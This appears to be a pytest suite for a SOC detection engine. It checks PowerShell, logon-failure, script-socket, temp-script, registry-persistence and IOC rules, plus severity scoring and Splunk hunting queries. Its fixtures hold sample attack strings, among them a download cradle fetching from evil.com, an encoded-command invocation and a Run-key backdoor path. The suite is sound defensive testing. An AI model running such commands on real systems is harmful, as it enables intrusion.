"""
Phase 6A: Advanced SOC Detection Engineering Test Suite
Validates detection improvements, false-positive reduction,
benign activity suppression, thresholding, time-windows,
parent-child process inspection, duplicate suppression, and threat-hunting SPL.
"""

import sys
import pytest
from pathlib import Path

BASE_DIR = Path(__file__).resolve().parent.parent
if str(BASE_DIR) not in sys.path:
    sys.path.insert(0, str(BASE_DIR))

from app.modules.siem_detection_engine import siem_detection_engine, DETECTION_RULES_CATALOG, BENIGN_DOMAIN_WHITELIST
from app.utils.splunk_client import splunk_client


# ============================================================================
# 1. Rules Catalog & Schema Validation
# ============================================================================

def test_01_detection_catalog_schema():
    """Verifies all 6 detection rules possess required Phase 6A metadata."""
    assert len(DETECTION_RULES_CATALOG) == 6
    for rule_id, meta in DETECTION_RULES_CATALOG.items():
        assert meta["rule_id"] == rule_id
        assert "name" in meta
        assert "description" in meta
        assert "detection_logic" in meta
        assert "required_telemetry" in meta
        assert "mitre_attack" in meta
        assert "technique_id" in meta["mitre_attack"]
        assert "severity" in meta
        assert "base_score" in meta
        assert "false_positive_considerations" in meta


# ============================================================================
# 2. DET-PS01: Suspicious vs Benign PowerShell
# ============================================================================

def test_02_det_ps01_positive_and_negative():
    """Tests DET-PS01 triggers on suspicious flags and rejects benign admin commands."""
    # Positive: Bypass flag & simulation marker
    pos_event = {
        "event_id": "1",
        "image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
        "command_line": "powershell.exe -ExecutionPolicy Bypass -NoProfile -Command Write-Output 'PHASE5_SIM_PS01_MARKER'",
        "user": "LAPTOP-OUBJLUDB\\YOGESH",
        "computer": "LAPTOP-OUBJLUDB"
    }
    pos_res = siem_detection_engine.evaluate_rule("DET-PS01", [pos_event])
    assert pos_res["matched"] is True
    assert pos_res["severity"] in ["High", "Critical"]
    assert pos_res["severity_score"] >= 65

    # Positive: In-memory evaluation and EncodedCommand
    pos_enc = {
        "event_id": "1",
        "image": "powershell.exe",
        "command_line": "powershell.exe -EncodedCommand V3JpdGUtT3V0cHV0ICdUZXN0Jw==",
        "user": "YOGESH"
    }
    assert siem_detection_engine.evaluate_rule("DET-PS01", [pos_enc])["matched"] is True

    # Negative (Benign Admin): Simple Get-Process
    neg_admin = {
        "event_id": "1",
        "image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
        "command_line": "powershell.exe Get-Process",
        "user": "YOGESH"
    }
    neg_res = siem_detection_engine.evaluate_rule("DET-PS01", [neg_admin])
    assert neg_res["matched"] is False, "Benign 'Get-Process' must not trigger suspicious PowerShell alert"

    # Negative via test_legitimate_activity helper
    legit_test = siem_detection_engine.test_legitimate_activity("powershell_admin", neg_admin)
    assert legit_test["is_benign_suppressed"] is True


# ============================================================================
# 3. DET-AUTH02: Thresholding & Typo Suppression
# ============================================================================

def test_03_det_auth02_threshold_and_typo_suppression():
    """Validates threshold enforcement: single failed logon is suppressed; >=3 fires."""
    # Negative: Single failed logon (isolated typo)
    single_typo = {
        "event_id": "4625",
        "target_user_name": "regular_employee",
        "workstation_name": "LAPTOP-OUBJLUDB",
        "status": "0xc000006d",
        "sub_status": "0xc000006a",
        "count": 1
    }
    single_res = siem_detection_engine.evaluate_rule("DET-AUTH02", [single_typo])
    assert single_res["matched"] is False, "Single failed logon below threshold (3) must not alert"

    # Positive: Burst of 4 failed logons (threshold >= 3)
    burst_events = [
        {"event_id": "4625", "target_user_name": "regular_employee", "sub_status": "0xc000006a"},
        {"event_id": "4625", "target_user_name": "regular_employee", "sub_status": "0xc000006a"},
        {"event_id": "4625", "target_user_name": "regular_employee", "sub_status": "0xc000006a"},
        {"event_id": "4625", "target_user_name": "regular_employee", "sub_status": "0xc000006a"}
    ]
    burst_res = siem_detection_engine.evaluate_rule("DET-AUTH02", burst_events)
    assert burst_res["matched"] is True
    assert burst_res["match_count"] == 4
    assert burst_res["severity"] in ["Medium", "High"]

    # Positive: Phase5SecTestUser test fixture
    test_user_res = siem_detection_engine.evaluate_rule("DET-AUTH02", [{"event_id": "4625", "target_user_name": "Phase5SecTestUser"}])
    assert test_user_res["matched"] is True


# ============================================================================
# 4. DET-NET03: LOLBAS Script Egress vs Browser Traffic
# ============================================================================

def test_04_det_net03_lolbas_vs_browser_traffic():
    """Validates script connection detection and browser false-positive rejection."""
    # Positive: PowerShell socket to port 5000
    pos_ps_socket = {
        "event_id": "3",
        "image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
        "destination_ip": "127.0.0.1",
        "destination_port": "5000",
        "user": "YOGESH"
    }
    assert siem_detection_engine.evaluate_rule("DET-NET03", [pos_ps_socket])["matched"] is True

    # Negative (Benign Browser): Chrome web connection to port 5000 / 8089
    neg_browser = {
        "event_id": "3",
        "image": "C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe",
        "destination_ip": "127.0.0.1",
        "destination_port": "5000"
    }
    neg_res = siem_detection_engine.evaluate_rule("DET-NET03", [neg_browser])
    assert neg_res["matched"] is False, "Standard browser traffic must not trigger unusual script socket alert"


# ============================================================================
# 5. DET-FILE04: Script Staging vs Ordinary Text Files
# ============================================================================

def test_05_det_file04_script_staging_vs_text_file():
    """Verifies that script creation in temp/staging alerts while text files are filtered."""
    # Positive: .ps1 created in AppData\Local\Temp
    pos_script = {
        "event_id": "11",
        "target_filename": "C:\\Users\\YOGESH\\AppData\\Local\\Temp\\downloader.ps1",
        "image": "powershell.exe"
    }
    assert siem_detection_engine.evaluate_rule("DET-FILE04", [pos_script])["matched"] is True

    # Negative: .txt document created in Temp
    neg_txt = {
        "event_id": "11",
        "target_filename": "C:\\Users\\YOGESH\\AppData\\Local\\Temp\\diagnostic_log.txt",
        "image": "notepad.exe"
    }
    assert siem_detection_engine.evaluate_rule("DET-FILE04", [neg_txt])["matched"] is False


# ============================================================================
# 6. DET-REG05: Autostart Persistence vs UI Settings
# ============================================================================

def test_06_det_reg05_persistence_vs_user_preference():
    """Verifies persistence registry alerting and exclusion of benign UI settings."""
    # Positive: Run autostart key
    pos_run = {
        "event_id": "13",
        "target_object": "HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\Updater",
        "details": "C:\\temp\\backdoor.exe"
    }
    assert siem_detection_engine.evaluate_rule("DET-REG05", [pos_run])["matched"] is True

    # Negative: Benign Explorer hidden files setting
    neg_pref = {
        "event_id": "13",
        "target_object": "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Advanced\\Hidden",
        "details": "1"
    }
    assert siem_detection_engine.evaluate_rule("DET-REG05", [neg_pref])["matched"] is False


# ============================================================================
# 7. DET-IOC06: Reputation Gating & Whitelist Filtering
# ============================================================================

def test_07_det_ioc06_reputation_and_whitelist_filter():
    """Verifies that whitelisted benign corporate domains do not trigger compromise alerts."""
    # Positive: Malicious external phishing domain with confirmed match
    pos_ioc = {
        "ioc_value": "account-update.xyz",
        "total_matches": 3,
        "anti_fabrication_verified": True
    }
    pos_res = siem_detection_engine.evaluate_rule("DET-IOC06", [pos_ioc])
    assert pos_res["matched"] is True
    assert pos_res["severity"] == "Critical"

    # Negative: Benign whitelisted corporate domain (microsoft.com)
    neg_whitelist = {
        "ioc_value": "microsoft.com",
        "total_matches": 10,
        "anti_fabrication_verified": True
    }
    neg_res = siem_detection_engine.evaluate_rule("DET-IOC06", [neg_whitelist])
    assert neg_res["matched"] is False, "Whitelisted corporate domain must not trigger IOC incident alert"


# ============================================================================
# 8. Evidence-Based Severity Scoring Safeguards
# ============================================================================

def test_08_evidence_based_severity_scoring():
    """Verifies that a single weak indicator never gets assigned Critical severity."""
    # Single weak indicator: Just a PowerShell execution without extra corroboration
    weak_event = {
        "event_id": "1",
        "image": "powershell.exe",
        "command_line": "powershell.exe -ExecutionPolicy Bypass"
    }
    weak_res = siem_detection_engine.evaluate_rule("DET-PS01", [weak_event])
    assert weak_res["severity"] != "Critical", "A single indicator must never be assigned Critical severity"

    # Highly corroborated multi-factor event: Suspicious Office parent + Encoded + Download cradle
    strong_event = {
        "event_id": "1",
        "image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
        "parent_image": "C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE",
        "command_line": "powershell.exe -ExecutionPolicy Bypass -enc VGVzdA== DownloadString('http://evil.com/payload.ps1')"
    }
    strong_res = siem_detection_engine.evaluate_rule("DET-PS01", [strong_event])
    assert strong_res["severity"] == "Critical"
    assert strong_res["severity_score"] >= 85
    assert len(strong_res["corroborating_factors"]) >= 2


# ============================================================================
# 9. Duplicate Alert Suppression
# ============================================================================

def test_09_duplicate_alert_suppression():
    """Verifies that rapid repeated identical events are flagged as suppressed."""
    event = {
        "event_id": "1",
        "image": "powershell.exe",
        "command_line": "powershell.exe -ExecutionPolicy Bypass PHASE5_SIM_PS01_MARKER",
        "user": "YOGESH",
        "computer": "LAPTOP-OUBJLUDB"
    }
    # First alert should not be suppressed
    first_res = siem_detection_engine.evaluate_rule("DET-PS01", [event])
    assert first_res["matched"] is True

    # Immediate second alert for identical signature should be marked suppressed
    second_res = siem_detection_engine.evaluate_rule("DET-PS01", [event])
    assert second_res["matched"] is True
    assert second_res["context"]["is_suppressed"] is True


# ============================================================================
# 10. Parent-Child Process Relationship Inspection
# ============================================================================

def test_10_parent_child_process_correlation():
    """Verifies that an unapproved parent (Word, Excel) elevates the severity score."""
    normal_parent_ev = {
        "event_id": "1",
        "image": "powershell.exe",
        "parent_image": "C:\\Windows\\explorer.exe",
        "command_line": "powershell.exe -ExecutionPolicy Bypass PHASE5_SIM_PS01_MARKER"
    }
    office_parent_ev = {
        "event_id": "1",
        "image": "powershell.exe",
        "parent_image": "C:\\Program Files\\Microsoft Office\\Office16\\EXCEL.EXE",
        "command_line": "powershell.exe -ExecutionPolicy Bypass PHASE5_SIM_PS01_MARKER"
    }
    score_normal = siem_detection_engine.evaluate_rule("DET-PS01", [normal_parent_ev])["severity_score"]
    score_office = siem_detection_engine.evaluate_rule("DET-PS01", [office_parent_ev])["severity_score"]

    assert score_office > score_normal, "Office parent process must elevate severity score"


# ============================================================================
# 11. Live Splunk Threat Hunting Queries Execution
# ============================================================================

def test_11_live_splunk_threat_hunting_queries():
    """Executes the 5 Phase 6 threat-hunting queries against live Splunk Enterprise."""
    hunting_queries = [
        # Query 1: Suspicious PowerShell Execution Hunt
        'index=sysmon EventID=1 (Image="*\\powershell.exe" OR Image="*\\pwsh.exe") | head 5',
        # Query 2: Repeated Authentication Failures Hunt
        'index=windows EventID=4625 | head 5',
        # Query 3: Suspicious Process Access (LSASS handle inspection)
        'index=sysmon EventID=10 TargetImage="*\\lsass.exe" | head 5',
        # Query 4: Persistence-Related Registry Changes Hunt
        'index=sysmon (EventID=12 OR EventID=13) | head 5',
        # Query 5: Suspicious Non-Browser Network Sockets Hunt
        'index=sysmon EventID=3 DestinationPort IN (5000, 8089, 4444, 8080) | head 5'
    ]

    for i, spl in enumerate(hunting_queries, 1):
        res = splunk_client.execute_search(spl, earliest="-7d")
        assert res.get("status") in ["success", "operational"], f"Hunting query {i} failed in live Splunk: {spl}"
        print(f"[LIVE HUNT {i}] Query '{spl}' returned {res.get('events_count', 0)} events.")

